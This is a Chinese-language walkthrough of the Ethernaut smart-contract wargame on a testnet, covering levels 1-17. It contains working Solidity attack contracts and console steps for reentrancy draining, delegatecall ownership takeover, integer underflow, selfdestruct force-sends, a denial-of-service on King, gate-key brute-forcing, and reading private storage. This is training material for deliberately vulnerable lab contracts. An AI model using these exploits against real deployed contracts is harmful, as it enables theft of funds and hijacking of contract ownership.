# 1 Hello Ethernaut

可以直接在控制台里输入contrac查看ABI的methods

await contract.password() 查看密码
'ethernaut0'
await contract.authenticate('ethernaut0') 输入密码
submit instance 

# 2 Fallback

阅读智能合约代码 receive() 可以修改owner, 修改owner后call withdraw()即可

2.1. await contract.contribute({value: 1})
call 完后查看是否有balance，就可以send了
2.2. await contract.getContribution()
1
2.3. 转 1 ether 
await contract.send(1)
2.4. await contract.owner()
'0xe5107dee9CcC8054210FF6129cE15Eaa5bbcB1c0'
# 最后一步，把钱取出来
2.5. await contract.withdraw()
submit instance 

# 3 Fallout

错误的构造函数拼写(1)

```
    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }
```

3.1. await contract.Fal1out()
3.2. await contract.owner()
'0xe5107dee9CcC8054210FF6129cE15Eaa5bbcB1c0'
submit instance

# 4 Coin Flip

错误的使用blocknumber作为随机数

```
    function flip(bool _guess) public {
        uint blockValue = uint(blockhash(block.number-1));
        uint coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
        bool side = coinFlip == 1 ? true : false;
        if (side == _guess) {
            totalWins[msg.sender]++;
        }
    }
```

编写攻击合约

```
pragma solidity ^0.8.0;

interface IChallenge {
    function flip(bool _guess) external payable returns (bool);
}

contract CoinFlipAttack {
    IChallenge challenge;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address challengeAddress) {
        challenge = IChallenge(challengeAddress);
    }

    function flip() public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        challenge.flip(side);
    }
}
```
部署合约（challenge address为目标合约）, 然后call 10次flip()即可
await contract.consecutiveWins()
10

submit instance

# 5 Telephone

```
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
        owner = _owner;
    }
}
```

其中

tx.origin 是最初发起交易的地址
msg.sender 是当前调用者的地址
因此通过中间合约调用即可修改owner

编写攻击合约

```
pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract Attack {
    address public targetContract;

    constructor(address _targetContract) {
        targetContract = _targetContract;
    }

    function attackChangeOwner(address _newOwner) public {
        Telephone(targetContract).changeOwner(_newOwner);
    }
}
```
call attackChangeOwner("你的地址")即可
await contract.owner()
'你的地址'
submit instance


# 6 Token

转账余额表没有校验，会溢出

```
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```

在Solidity版本0.8.0之前，uint256类型的减法操作不会自动进行溢出检查。
如果_value大于balances[msg.sender]，balances[msg.sender] - _value 会发生溢出（underflow），这会导致balances[msg.sender]的值变为一个非常大的数字（由于uint256是一个无符号整数，在溢出时，它会从0变为2^256 - 1）


6.1. 转一笔超过自己余额的交易, 让balance溢出

await contract.transfer(player, 1000000000000)

submit instance


# 7 Delegate

delegatecall 是一个低级的EVM（以太坊虚拟机）指令，它允许一个合约调用另一个合约的代码，同时保持原调用合约的上下文。
这意味着在delegatecall过程中，被调用的合约代码会在原合约的存储和余额上下文中执行。

在Remix里使用de legatecall调用合约的ABI

```
contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}
```

调用pwn()即可, deletegatecall会修改主合约的owner
await contract.owner()

submit instance

# 8 Force

猜测这个合约会自动在receive或者fallback里退回用户的转账。
我们可以使用攻击合约来调用这个合约，然后在receive或者fallback里调用selfdestruct来销毁合约

selfdestruct是一种特殊的EVM指令，它会销毁调用该指令的合约，并将合约中的所有剩余余额发送到指定的地址。在攻击合约中，selfdestruct指令被调用时：

* 攻击合约的代码和状态将从区块链上删除。

* 所有剩余的以太币将被发送到指定的地址（在这种情况下，目标合约地址）。

selfdestruct操作本质上是无法退款的行为。当调用selfdestruct时，攻击合约的所有状态数据和代码都被删除，且所有资金被直接转入目标地址。

编写攻击合约
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackContract {
    address payable public victim;

    constructor(address payable _victim) {
        victim = _victim;
    }

    function attack() external payable {
        require(msg.value > 0, "Send some Ether to attack");
        selfdestruct(victim);
    }

    fallback() external payable {
        selfdestruct(payable(msg.sender)); 
    }

    receive() external payable {
        selfdestruct(payable(msg.sender));
    }
}
```
执行attack()即可

await getBalance(contract.address)
'1'

submit instance

In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.

However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.

# 9 Vault

在Solidity中，private关键字用于声明合约中的私有状态变量，意味着这些变量只能在合约内部访问，不能被外部合约或外部用户直接访问。
然而，以太坊的存储是公开的，任何人都可以查看区块链上的数据，包括合约的存储状态。

9.1. 查看合约的私有变量

```
from web3 import Web3

api_key = "你的Infura API key"
infura_url = "https://sepolia.infura.io/v3/" + api_key
web3 = Web3(Web3.HTTPProvider(infura_url))

if web3.is_connected():
    print("Connected to Sepolia test network")
else:
    print("Failed to connect to Sepolia test network")

contract_address = "0xa7fe40ba92f046118cd5a0d876ad327f1fb0f1d1"
checksum_address = Web3.to_checksum_address(contract_address)

def get_contract_info(address):
    balance = web3.eth.get_balance(address)
    print(f"Contract Balance: {web3.from_wei(balance, 'ether')} ETH")

    transaction_count = web3.eth.get_transaction_count(address)
    print(f"Transaction Count: {transaction_count}")

    code = web3.eth.get_code(address)
    if code != b'':
        print("Contract Code exists, this is a contract address.")
    else:
        print("No contract code, this is likely an externally owned address.")

def get_storage_values(address, slots):
    for slot in slots:
        storage_value = web3.eth.get_storage_at(address, slot)
        print(f"Storage at slot {slot}: {storage_value.hex()}")

get_contract_info(checksum_address)

storage_slots_to_check = [0, 1]
get_storage_values(checksum_address, storage_slots_to_check)
```

输出结果为
```
Connected to Sepolia test network
Contract Balance: 0 ETH
Transaction Count: 1
Contract Code exists, this is a contract address.
Storage at slot 0: 0x0000000000000000000000000000000000000000000000000000000000000001
Storage at slot 1: 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```

因为智能合约为
```

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

可以知道slot 0为locked，slot 1为password

9.2. 执行unlock

await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
{tx: '0x9fb119f3ebdd6e1043e27d6cbc952ca5548f7ffe1785d070ca7294acd4d653b0', receipt: {…}, logs: Array(0)}
await contract.locked()
false

submit instance

在Solidity中，所有状态变量都存储在以太坊合约的存储中。每个状态变量都有一个存储槽（Storage Slot）位置，Solidity编译器将根据变量的声明顺序和类型决定它们在存储中的位置。

存储槽的分配规则
基本类型（如uint256、address等）：

基本类型的变量按声明顺序分配到下一个可用的存储槽中。每个存储槽的大小是256位（32字节）。
例如，第一个声明的uint256变量存储在槽0，第二个声明的uint256变量存储在槽1，依此类推。
结构体（Struct）和静态数组（Fixed-size Array）：

结构体和静态数组会占用一个或多个完整的存储槽。它们的存储位置也是按声明顺序分配的。
例如，一个struct或一个uint256[2]的数组可能会占用连续的两个存储槽。
映射（Mapping）和动态数组（Dynamic Array）：

映射和动态数组的存储更加复杂，因为它们的大小在编译时未知。
映射类型的存储位置通过计算哈希值来确定，存储键值对的存储槽为keccak256(h(k) . p)，其中p是映射变量的位置。
动态数组的长度存储在主槽中，数组元素存储在计算的槽之后的位置。

# 10 King

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

读取合约发现prize的初始值为1000000000000000, 因此我们需要转1000000000000001wei来攻击合约
为了阻止owner reclaim kingship，我们需要让合约无法正常执行下去，可以通过中间合约来转账成为king，然后销毁中间合约。
这样 payable(king).transfer(msg.value); 就无法执行下去了，owner就无法取回kingship了

编写攻击合约
```
pragma solidity ^0.8.0;

contract AttackContract {
    address payable public victim;

    constructor(address payable _victim) {
        victim = _victim;
    }

    function sendAllEthToVictim() external payable {
        require(msg.value > 0, "Send some Ether to transfer");

        (bool sent, ) = victim.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }

    function destroyContract() external {
        selfdestruct(payable(msg.sender));
    }

    fallback() external payable {
        selfdestruct(payable(msg.sender)); 
    }

    receive() external payable {
        selfdestruct(payable(msg.sender));
    }
}

```
执行 sendAllEthToVictim(), 转1000000000000001wei
执行 destroyContract()销毁合约
submit instance

# 11 Reentrancy

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

这个合约使用SafeMath的add，溢出攻击是无效的。
我们可以通过重入攻击，在balances[msg.sender] -= _amount; 之前再次调用withdraw()来重复提现。

11.1 编写攻击合约

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IContract {
    function withdraw(uint256 _amount) external;
    function donate(address _to) external payable;
}

contract AttackContract {
    IContract victim;

    constructor(address payable _victim) {
        victim = IContract(_victim);
    }

    function withdraw(uint256 _amount) public {
        victim.withdraw(_amount);
    }


    fallback() external payable {
        victim.withdraw(msg.value);
    }

    receive() external payable {
        victim.withdraw(msg.value);
    }
}
```

11.2 查看合约balance，donate相同数量的wei

attacker =  "0xfa6ddaf8194c20a72c5be4b4ad4aa1ed4138c091";
toWei(await getBalance(contract.address))
'1000000000000000'
await contract.donate(attacker, {value: 1000000000000000})

11.3 通过攻击合约调用withdraw

https://sepolia.etherscan.io/tx/0x245d096511d20ec8c2d391e637a52af691271a1ceada1a0f6f06ab58c4576e4f

11.4 查看合约balance

toWei(await getBalance(contract.address))
'0'

submit instance

# 12 Elevator

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```

编写攻击合约，设置一个toggle变量，可以让第二次调用isLastFloor返回true

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Attacker is Building {
    Elevator public elevator;
    bool public toggle = true;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint256) external override returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function attack(uint256 _floor) public {
        elevator.goTo(_floor);
    }
}
```

调用attack(1)即可   

submit instance

后来发现这道题有其他的解决方案，使用view或者pure函数避免state修改，使用其他判断条件来返回ture/false 

1. view 和 pure 函数修饰符
view 修饰符：

view 修饰符用于标记一个函数，该函数不会修改区块链上的状态。这意味着函数不能更改状态变量，也不能执行诸如发送以太币或调用其他可能修改状态的合约之类的操作。
使用 view 修饰符可以优化合约的安全性和性能，因为它确保函数不会意外地更改合约的状态。

pure 修饰符：

pure 修饰符比 view 更严格，表示该函数不仅不会修改状态，也不会读取状态。pure 函数只能使用其参数，并且不能访问或依赖于合约中的任何状态变量。
pure 修饰符通常用于纯计算函数，比如数学运算，或者任何不依赖于区块链状态的逻辑。

```
contract Attacker is Building {
    Elevator public elevator;
    bool public toggle = true;

    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }

    function isLastFloor(uint256) external view override returns (bool) {
        return gasleft() % 2 == 0; // 根据gas剩余量的奇偶性返回不同结果
    }

    function attack(uint256 _floor) public {
        elevator.goTo(_floor);
    }
}
```

# 13 Privacy

通过脚本扫描slot 

Contract Code exists, this is a contract address.
Storage at slot 0: 0x0000000000000000000000000000000000000000000000000000000000000001
Storage at slot 1: 0x0000000000000000000000000000000000000000000000000000000066d66248
Storage at slot 2: 0x000000000000000000000000000000000000000000000000000000006248ff0a
Storage at slot 3: 0xa8168c3dc4f1c7490190a66c9185db8fe97a9cd244b224ed18a19c2127bb0746
Storage at slot 4: 0x71b581aea3cdfd96604b03f32c942f8b11827b053ebae6f8ec257b5779566ac3
Storage at slot 5: 0x6d624ba3fa9b9a71bbe0ee5cb4c2583f46092c899e5e323dc5a33b2f73cc8ad1
Storage at slot 6: 0x0000000000000000000000000000000000000000000000000000000000000000
Storage at slot 7: 0x0000000000000000000000000000000000000000000000000000000000000000
Storage at slot 8: 0x0000000000000000000000000000000000000000000000000000000000000000
Storage at slot 9: 0x0000000000000000000000000000000000000000000000000000000000000000
Storage at slot 10: 0x0000000000000000000000000000000000000000000000000000000000000000
Storage at slot 11: 0x0000000000000000000000000000000000000000000000000000000000000000
Storage at slot 12: 0x0000000000000000000000000000000000000000000000000000000000000000
Storage at slot 13: 0x0000000000000000000000000000000000000000000000000000000000000000
Storage at slot 14: 0x0000000000000000000000000000000000000000000000000000000000000000
Storage at slot 15: 0x0000000000000000000000000000000000000000000000000000000000000000

Slot 0: bool public locked = true;

locked 变量是一个布尔型，占用 1 个字节。0x01 表示 true，所以 0x000...001 的值表明该变量设置为 true。
Slot 1: uint256 public ID = block.timestamp;

ID 是一个 uint256 类型，占用 32 字节。存储槽 1 中的值是 0x0000000000000000000000000000000000000000000000000000000066d66248，这是一个 32 字节的整数。
Slot 2:

这里我们有三个变量：uint8 flattening、uint8 denomination 和 uint16 awkwardness。
它们分别占用 1、1 和 2 字节，总共占用 4 字节，存储在同一个槽中。
0x000000000000000000000000000000000000000000000000000000006248ff0a 的最低字节（右边）部分是 0x0a (10)，是 flattening 变量。
下一个字节是 0xff (255)，是 denomination 变量。
awkwardness 变量是一个 uint16，是 0x6248（25032，以十六进制表示）。这些值被打包在同一个槽中。
Slots 3, 4, 5: bytes32[3] private data;

data 是一个 bytes32 数组，包含三个元素。每个 bytes32 占用 32 字节（1 个槽），因此 data[0] 位于槽 3，data[1] 位于槽 4，data[2] 位于槽 5。
从读取到的存储数据：
Slot 3: 0xa8168c3dc4f1c7490190a66c9185db8fe97a9cd244b224ed18a19c2127bb0746 对应 data[0]
Slot 4: 0x71b581aea3cdfd96604b03f32c942f8b11827b053ebae6f8ec257b5779566ac3 对应 data[1]
Slot 5: 0x6d624ba3fa9b9a71bbe0ee5cb4c2583f46092c899e5e323dc5a33b2f73cc8ad1 对应 data[2]

data[2] 从 bytes32 到 bytes16 的转换是 0x6d624ba3fa9b9a71bbe0ee5cb4c2583f （保留了一半的长度）

解锁
await contract.unlock("0x6d624ba3fa9b9a71bbe0ee5cb4c2583f")

submit instance

存储槽分配规则
每个存储槽大小为 32 字节（256 位）：

Solidity 的存储是基于 32 字节的存储槽模型。每个槽能够容纳多达 32 字节的数据。
按顺序存储：

状态变量按它们在合约中声明的顺序存储。
变量打包：

如果多个状态变量的大小之和小于或等于 32 字节（例如，bool、uint8、uint16 等），它们将被打包在同一个存储槽中。
如果一个状态变量不能完全打包到当前的存储槽中（例如，它是一个 uint256 或 bytes32 类型），它将被存储在一个新的存储槽中。

# 14 Gatekeeper One

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```

enter前面使用了三个modifier，gateOne、gateTwo 和 gateThree。这些 modifier 会在 enter 函数执行之前执行，以确保满足一些条件。

gateOne: 需要中间合约调用
gateTwo: 需要 gasleft() % 8191 == 0 
 - 这里选择直接 bruteforce，也可以通过remix debug的方式找到正确的gasleft或者减少bruteforce的范围

gateThree: 需要 _gateKey 满足三个条件, 需要仔细分析

用B1-B8表示_gateKey的8个字节
1. require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
0x B5 B6 B7 B8 = 0 x 00 00 B7 B8,

Hence B5 = 0, B6 = 0

2. require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");

0x 00 00 00 00 B5 B6 B7 B8 != 0 x B1 B2 B3 B4 B5 B6 B7 B8

B1, B2, B3, B4 != 0

3. require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");

0x B5 B6 B7 B8 == 0x 00 00 last 2 bytes of tx.origin

B7 B8 = last 2 bytes of tx.origin

hence gate key = 0x Any Any Any Any 00 00 last 2 bytes of tx.origin

bytes8(uint64(tx.origin) & 0xFFFFFFFF0000FFFF


编写攻击合约

```
pragma solidity ^0.8.0;

contract GatekeeperOneAttack {
    address public victim;

    constructor(address _victim) {
        victim = _victim;
    }

    function attack() external {
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF; 
        for (uint256 i = 0; i <= 8191; i++) {
            (bool success, ) = address(victim).call{gas: 8191 + i}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
    }
}

```

检查slot

Connected to Sepolia test network
Contract Balance: 0 ETH
Transaction Count: 1
Contract Code exists, this is a contract address.
Storage at slot 0: 0x000000000000000000000000e5107dee9ccc8054210ff6129ce15eaa5bbcb1c0

submit instance

# 15 Gatekeeper Two

2024-09-04 暂时跳过
```
```

# 16 Naught Coin

这个题目要求我们绕过transfer函数的限制来进行ERC20的代币转账，合约使用了OpenZeppelin的ERC20模版。

查看contract abi发现Approve可以使用，可以通过approve来绕过transfer的限制

receiver = "0xd262Cd4eecF8Db4D44024CF1F892ee8D634B25Ae"
'0xd262Cd4eecF8Db4D44024CF1F892ee8D634B25Ae'

balance = await contract.balanceOf(player)
balance.toString()
'1000000000000000000000000'

执行approve
await contract.approve(receiver, '1000000000000000000000000')

allowance = await contract.allowance(player, receiver)
allowance.toString()
'1000000000000000000000000'

使用transferFrom来转账
await contract.transferFrom(player, receiver, '1000000000000000000000000')

https://sepolia.etherscan.io/tx/0x95b58b47f9552fe64003d01f63e9e772add4f001110313ff8f5eed9526f29ea6

submit instance

# 17 Preservation

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```
